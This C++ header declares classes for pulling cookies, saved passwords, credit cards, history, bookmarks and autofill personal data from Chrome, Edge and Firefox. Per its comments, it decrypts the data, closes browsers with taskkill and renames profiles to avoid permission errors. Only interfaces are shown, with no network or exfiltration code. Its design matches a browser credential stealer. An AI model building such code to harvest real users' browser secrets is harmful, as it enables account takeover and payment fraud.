#pragma once

#include "../../external/base64.h"
#include "../../external/json.hpp"
#include "../../external/sqlite3.h"

#include <string>
#include <typeindex>
#include <iostream>
#include <algorithm>

#ifdef _WIN32
#include <Windows.h>
#include <ShlObj_core.h>
#endif

// What to rename the default browser profile when working on files inside of it
// Prevents invalid permission errors
#ifndef _MODIFIED_PROFILE_NAME
#define _MODIFIED_PROFILE_NAME "profile_modified" 
#endif

using JSON = nlohmann::json;

namespace Browsing
{
    typedef int         BrowserIdentifier;
    typedef const char* BrowserName;
    

    /*
      A structure representing a browser
      Continas paths and identifiers to tell which browser is used
    */
    typedef struct BrowserInfoStr
    {
        // ---------    FILES    ---------
        std::string fLoginData   = "null"; // Login Data File
        std::string fCookieFile  = "null"; // Cookies Data File
        std::string fHistoryFile = "null"; // File which contains search history
        std::string fExeFile     = "null"; // Location of the exe for the browser

        // ---------    PATHS    ---------
        std::string pProfiles       = "null";       // Profiles folder
        std::string pProfileDefault = "null"; // Default browswer profile path

        // --------- IDENTIFIERS ---------
        BrowserIdentifier iBrowserIdentifier = -1;
        BrowserName       sBrowserNameString = "null";


        // ------- CHROME BROWSER FILES ---------
        std::string fLocalState = "exception";  // Local state file
        std::string pNetwork    = "exception"; // Network file path
        std::string fBookmarks  = "exception"; // saved bookmarks
    };

    /*
       A class which holds blobs of info created by browsers
       that store information

       These include but arent limited to Cookie info blobs,
       password info blobs, and history blobs
    */
    namespace BrowserEntities
    {
        /*
            Ints represnting BrowserEntity objects
         */
        enum BrowserEntitiesTypes
        {
            ENTITY_NONE          = -1,
            ENTITY_COOKIE        = 1,
            ENTITY_PASSWORD      = 2,
            ENTITY_BROWSER_ENTRY = 3, // Search history entry
            ENTITY_CREDIT_CARD   = 4,
            ENTITY_BOOKMARK      = 5, 
            ENTITY_CREDENTIALS   = 6, // Personal information like addresses, fullnames, and more
        };

        struct Cookie // Browser Cookie
        {
            bool        valid        = false;
            long long   cookieExpiry = -1;
            std::string cookieName   = "null";
            std::string cookieValue  = "null";
            std::string cookieHost   = "null";
            std::string cookiePath   = "null";

            const BrowserEntitiesTypes browserEntityType = ENTITY_COOKIE;
            
            void output();
        };

        struct Password // Saved Browser Password
        {
            bool        valid         = false;
            std::string originURL     = "null";
            std::string actionURL     = "null";
            std::string usernameValue = "null";
            std::string passwordValue = "null";

            const BrowserEntitiesTypes browserEntityType = ENTITY_PASSWORD;

            void output();
        };

        struct BrowsingEntry // Field found in browser history
        {
            bool        valid = false;
            long        id = -1;
            long        visitCount = -1; 
            std::string url = "null";
            std::string title = "null";
            std::string description = "null";

            const BrowserEntitiesTypes browserEntityType = ENTITY_BROWSER_ENTRY;
            
            void output();
        };

        struct CreditCard // Saved Credit Card
        {
            bool        valid = false;
            std::string cardNumber;
            std::string cardType;
            std::string holderFullName;
            std::string expiry;
            std::string addresses; // a json list of addresses

            const BrowserEntitiesTypes browserEntityType = ENTITY_CREDIT_CARD;
            
            void output();
        };

        struct Bookmark // Saved browser bookmark
        {
            bool        valid = false;
            long         id    = -1;
            long         fk    = -1;
            std::string url   = "null";
            std::string title = "null";

            const BrowserEntitiesTypes browserEntityType = ENTITY_BOOKMARK;

            void output();
        };

        /*
            A structure represnting browser-saved personal information.
            This includes First Names, Last Names, and Addresses
         */
        struct PersonalInfo
        {
            bool        valid               = false;
            std::string streetAddress       = "null"; // Main street address
            std::string addressLevel1       = "null"; // Province//State : Abbreviated to two letters
            std::string addressLevel2       = "null"; // City
            std::string postalCode          = "null";
            std::string givenName           = "null"; // First Name
            std::string additionalName      = "null"; // Middle Name
            std::string familyName          = "null"; // Last Name
            std::string fullName            = "null";
            std::string organization        = "null";
            std::string countryAbbreviated  = "null";
            std::string phoneNumberNational = "null"; // No country code
            std::string linkedEmail         = "null";

            const BrowserEntitiesTypes browserEntityType = ENTITY_CREDENTIALS;
          
            void output();
        };
    };

    /*
       A structure representing the result after opening
       and preparing an sql file for a query in which
       the sql statement will be saved in 'stmt'
    */
    struct SQL_BLOB
    {
        int            statusCode = SQLITE_ERROR;
        sqlite3*       db         = nullptr;
        sqlite3_stmt*  stmt       = nullptr;

        /*
            Check if the structs status code is sqlite_ok
            This means any operation that inputted data into this struct
            has succeeded.
         */
        bool validate() {
            if (statusCode == SQLITE_OK && db && stmt)
                return true;
            
            std::cerr << "ERROR: SQL_BLOB Is Not Valid. Invalid Information." << std::endl;
            throw std::runtime_error("SQL_BLOB Invalid");
        }

    };

    // Represents a browsers type. Used as a way to identify a browser
    typedef enum BrowserTypes
    {
        Browser_MicrosoftEdge = 1,
        Browser_GoogleChrome  = 2,
        Browser_Firefox       = 3,
    };

    // BrowserIdentifiers which represent BrowserNames
    inline std::unordered_map<BrowserIdentifier, BrowserName> IdentifierNames =
    {
        { BrowserTypes::Browser_Firefox,       "Mozilla Firefox" },
        { BrowserTypes::Browser_GoogleChrome,  "Google Chrome"   },
        { BrowserTypes::Browser_MicrosoftEdge, "Microsoft Edge"  },
    };

    /*
        Two different ways to indentify browsers.
        Both identifiers can be used interchangable when describing a browser
     */
    const  BrowserName        IdentifierToName(BrowserIdentifier& identifier);
    const  BrowserIdentifier  BrowserNameToIdentifier(BrowserName& nameString);

    /*
       Prepare and open an sql file, then
       execute a query to return an sql statement
       and an sqlite3 object type.
    */
    const  SQL_BLOB  SQLPrepareAndQuery(
        const char* query,
        const char* sqlDataBase /* The file path of the sqlite file to open */
    );

    /*
       Function which takes in BrowserInfo struct which was constructed
       alongside a Browser derived class. This struct holds file paths
       which are vital to the program in terms of how it runs and completes.
       
       Checks each path present in the struct and confirms whether or not its a
       valid path on the local machine.
    */
    bool AreBrowserPathsValid(BrowserInfoStr& browserInfo);

    template <class _Ty, class _Allocator = std::allocator<_Ty>>
    class browser_vector : public std::vector<_Ty, _Allocator>
    {
    public:
        _Ty operator[](int index) {
            return this->at(index);
        }

        /*
         * Output the browser entity properties if _Ty is
         * a browser entity
         */
        void output() {
            for (auto& e : *this)
                e.output();
        }

        int size_on_disk() {
            for (auto& e : *this) {
                switch (e.browserEntityType)
                {
                case BrowserEntities::ENTITY_COOKIE:
                    return this->size() * 685; // 4 KILOBYTES MAX a cookie / average 685 BYTES a cookie
                case BrowserEntities::ENTITY_BOOKMARK:
                    return this->size() * 225; // 225 Bytes is the average size of a bookmark
                case BrowserEntities::ENTITY_BROWSER_ENTRY:
                    return this->size() * 2225; // 2.25 kb average, 2225 bytes
                default:
                    return -1;
                }
            }

        }
    };

    // ------- Browser Interface --------
    /*
     * @class Browser
     * @brief Base class representing a generic web browser.
     *
     * This class provides common functionality and data structures for various web browsers.
     * It includes methods for managing browser cookies and saved passwords, as well as functions
     * to convert between BrowserIdentifier and BrowserName.
    */
    class Browser
    {
    protected:
        Browser() = default;
        ~Browser() = default;

        bool ArePathsValid = false; // Bool representing if the current browser paths exist

        /* A struct to describe the base current browser info such as paths, files, and browser identifiers */
        BrowserInfoStr* CurrentBrowserInfo = new BrowserInfoStr;

        /* Update the total cookies to the size of Cookies vector */
        template  <typename objectArray>
        void UpdateTotalNumOfObjects(
            const browser_vector<objectArray>& objects
        );

        /*
            An std map which links different types of vectors that hold BrowserEntities
            to a browser entity type enum. Used to get the browser entity type for
            the following switch-case statement to determine how to format the
            output.
         */
        std::map<std::type_index, BrowserEntities::BrowserEntitiesTypes> BrowserEntityObjToType =
        {
            { typeid(browser_vector<BrowserEntities::Bookmark>), BrowserEntities::ENTITY_BOOKMARK },
            { typeid(browser_vector<BrowserEntities::BrowsingEntry>), BrowserEntities::ENTITY_BROWSER_ENTRY },
            { typeid(browser_vector<BrowserEntities::Cookie>), BrowserEntities::ENTITY_COOKIE },
            { typeid(browser_vector<BrowserEntities::Password>), BrowserEntities::ENTITY_PASSWORD },
            { typeid(browser_vector<BrowserEntities::PersonalInfo>), BrowserEntities::ENTITY_CREDENTIALS }
        };


        /*
            Total number of browsing info found by one or more of these methods.
            Useful for debugging or to get a number on how many objects were pulled.
         */
        int TotalCookies = -1;
        int TotalPasswords = -1;
        int TotalHistoryEntries = -1;
        int TotalBookmarks = -1;
        int TotalSavedSensitiveInfo = -1;

        /*
           A map where browser entity enums represents the total amount of entities
           found for that object type.
           For example:
           Bookmarks : TotalBookmarks.
           The bookmark enum represents the total bookmarks found.
         */
        std::map<int, std::reference_wrapper<int>> EntityTypeToCount =
        {
            { BrowserEntities::ENTITY_BOOKMARK, std::ref(this->TotalBookmarks) },
            { BrowserEntities::ENTITY_BROWSER_ENTRY, std::ref(this->TotalHistoryEntries) },
            { BrowserEntities::ENTITY_CREDENTIALS, std::ref(this->TotalSavedSensitiveInfo)  },
            { BrowserEntities::ENTITY_PASSWORD, std::ref(this->TotalPasswords) },
        };
    public:

        virtual int NumOfFoundObjects(
            BrowserEntities::BrowserEntitiesTypes objectType=BrowserEntities::ENTITY_NONE,
            bool  printInfo=false
        ) = 0;

        /*
            Vectors of information saved by the web browser
            Contains blobs of information. All instances of encrypted-
            information is decrypted upon the addition of the element.
         */
        browser_vector<BrowserEntities::Cookie>          Cookies; // Vector of cookies
        browser_vector<BrowserEntities::Password>        Passwords; // Vector of passwords
        browser_vector<BrowserEntities::BrowsingEntry>   History; // Browsing History
        browser_vector<BrowserEntities::Bookmark>        Bookmarks; // Saved Credit Cards
        browser_vector<BrowserEntities::PersonalInfo>    SavedPersonalInfo; // Saved Personal Info IRL

        /*
           Virtual functions which are dependent based on the type of browser.
           These are virtual because the way different browsers may encrypted their info
         */
        virtual   browser_vector<BrowserEntities::Cookie>          GetBrowserCookies() = 0;
        virtual   browser_vector<BrowserEntities::BrowsingEntry>   GetBrowserHistory() = 0;
        virtual   browser_vector<BrowserEntities::Password>        GetSavedPasswords() = 0;
        virtual   browser_vector<BrowserEntities::Bookmark>        GetBrowserBookmarks() = 0;

        /* 
            Self explanatory; return current classes browserinfo struct
         */
        const BrowserInfoStr BrowserInfo() {
            return *CurrentBrowserInfo;
        }

        virtual void Destroy() {
            this->~Browser();
        }

        virtual void Browse(std::string searchQuery) = 0;

        virtual std::string GetExePath() = 0;

    protected:

        /* 
           Close the browser by using taskkill 
           
           Links the browser identifier variable in the class
           to an application name to use with taskkill /im
         */
        void CloseBrowser(BrowserIdentifier browserid);
    };


    /*
       Get functions to retrieve members of a browser
       inherited class/browser object type.

       These include returning total amount of cookies and passwords,
       Getting installed browsers and more.
     */
    static std::vector<BrowserIdentifier> GetInstalledBrowsers();

    /*
        Get all installed browsers than create a Browser object for the
        installed browsers found.
        After, put the all in a vector then return them.

        Basically, get all installed browser than create browser objects
        for them to work on them and using class methods.
     */
    browser_vector<Browser*> InstalledBrowsersToObject();

    void DestroyBrowsers(browser_vector<Browser*> browsers);

    // ------- Google Chrome Browser --------
    /**
     * @class Chrome
     * @brief Represents the Google Chrome web browser.
     *
     * This class extends the Browser class and provides specific functionality for
     * interacting with the Google Chrome browser, including retrieving cookies and saved passwords.
     */
    class Chrome : public Browser
    {
    public:
        Chrome();
        ~Chrome();

        virtual int NumOfFoundObjects(
            BrowserEntities::BrowserEntitiesTypes objectType = BrowserEntities::ENTITY_NONE,
            bool  printInfo = false
        ) override;

        virtual void Destroy() {
            this->~Chrome();
        }

        void Browse(std::string searchQuery) override;

        std::string GetChromePath();
        std::string GetExePath() override;

        browser_vector<BrowserEntities::Cookie>          GetBrowserCookies() override;
        browser_vector<BrowserEntities::BrowsingEntry>   GetBrowserHistory() override;
        browser_vector<BrowserEntities::Password>        GetSavedPasswords() override;
        browser_vector<BrowserEntities::Bookmark>        GetBrowserBookmarks() override;
    };

    // ------- Firefox Browser --------
    /**
     * @class Mozilla
     * @brief Represents the Mozilla Firefox's web browser.
     *
     * This class extends the Browser class and provides specific functionality for
     * interacting with the Firefox browser, including retrieving cookies and saved passwords.
     */
    class Mozilla : public Browser
    {
    public:
        Mozilla();
        ~Mozilla();

        virtual void Destroy() {
            this->~Mozilla();
        }

        static std::string GetDefaultProfileFolder();
        static std::string GetProfilesFolder();
        static std::string GetMozillaPath();
        std::string GetExePath() override;

        virtual int NumOfFoundObjects(
            BrowserEntities::BrowserEntitiesTypes objectType = BrowserEntities::ENTITY_NONE,
            bool  printInfo = false
        ) override;
        
        void Browse(std::string searchQuery) override;

        browser_vector<BrowserEntities::Cookie>          GetBrowserCookies() override;
        browser_vector<BrowserEntities::BrowsingEntry>   GetBrowserHistory() override;
        browser_vector<BrowserEntities::Password>        GetSavedPasswords() override;
        browser_vector<BrowserEntities::Bookmark>        GetBrowserBookmarks() override;
        browser_vector<BrowserEntities::PersonalInfo>    GetSavedPersonalInfo();

    };
}

using namespace Browsing;


// -------- Browser Exception Interface --------
/**
 * @class browser_error
 * @brief Custom exception class for browser-related errors.
 *
 * This class inherits from the standard C++ exception class 'std::exception' and is designed
 * to handle various error scenarios that may occur in a browser-related application.
 * It provides error codes and error messages for different types of errors.
 */
class browser_error : public std::exception
{
public:
    /**
     * Enumeration of error codes for browser_error.
     */
    typedef enum
    {
        NONE = 0,               ///< No error.
        ERR_INVALID_PATH = 0100,///< Invalid path error.
        ERR_INVALID_PATHS = 0101,///< Invalid paths error.
        ERR_ACCESS_DENIED = 0200,///< Access denied error.
        
        SQL_OPEN_EXCEPTION = 0010,///< SQL database open exception error.
        SQL_PREPARE_EXCEPTION = 0020,///< SQL database prepare statement exception error.
        SQL_PREP_AND_QUERY_ERR = 0030,///< SQL database prepare and query error.
        SQL_GENERAL_EXCEPTION = 0040, // < SQL Error Occurs. General error that happend with SQL.
        SQL_VALIDATE_EXCEPTION = 0050, // < SQL_BLOB had invalid information. Failed to validate.

        ERR_UNKNOWN = 404       ///< Unknown error.
    } error_codes;
private:
    error_codes ErrorType = NONE;///< The error code.
    const char* ErrorMsg = "";   ///< The error message.

public:

    /**
     * Constructor for a lethal error that terminates the program.
     *
     * @param errMsg The error message.
     * @param errCode The error code.
     */
    template <typename _Enum>
    explicit browser_error(const char* errMsg, _Enum errCode=NONE)
        : ErrorMsg(errMsg), ErrorType(errCode)
    {
        SetLastError((DWORD)errCode);
        std::exception(ErrorMsg);
    }

    /**
     * Get the error message associated with this exception.
     *
     * @return A pointer to the error message.
     */
    const char* what() {
        return ErrorMsg;
    }

    /**
     * Get the error code associated with this exception.
     *
     * @return The error code.
     */
    int code() {
        return ErrorType;
    }
};
